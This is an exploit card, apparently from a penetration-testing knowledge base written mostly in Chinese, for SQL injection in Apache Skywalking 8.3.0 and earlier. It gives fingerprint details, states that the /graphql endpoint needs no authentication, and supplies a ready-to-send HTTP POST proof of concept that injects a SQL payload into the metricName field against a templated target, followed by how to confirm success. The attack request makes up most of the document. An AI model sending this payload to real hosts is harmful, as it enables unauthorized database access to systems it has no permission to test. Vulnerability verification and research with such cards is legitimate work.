# Skywalking SQL Injection (8.3.0-sqli)

## 指纹特征
- 服务: Apache Skywalking <= 8.3.0
- 端口: 8080 (Dashboard)
- 场景: GraphQL 接口 H2 数据库注入

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| GraphQL 注入 | `/graphql` | 无 |

## PoC 指令

通过构造 GraphQL 查询，在 `metricName` 参数中进行 SQL 注入：

```http
POST /graphql HTTP/1.1
Host: {{TARGET}}:8080
Content-Type: application/json

{
    "query":"query queryLogs($condition: LogQueryCondition) {
      queryLogs(condition: $condition) {
        total
      }
    }",
    "variables":{
        "condition":{
            "metricName":"sqli') or 1=1 -- ",
            "state":"ALL",
            "paging":{
                "pageSize":10
            }
        }
    }
}
```

## Success Signal
- **状态验证**: 发送注入语句后，服务器返回数据库错误信息或非预期的查询结果，证实 SQL 注入成功。
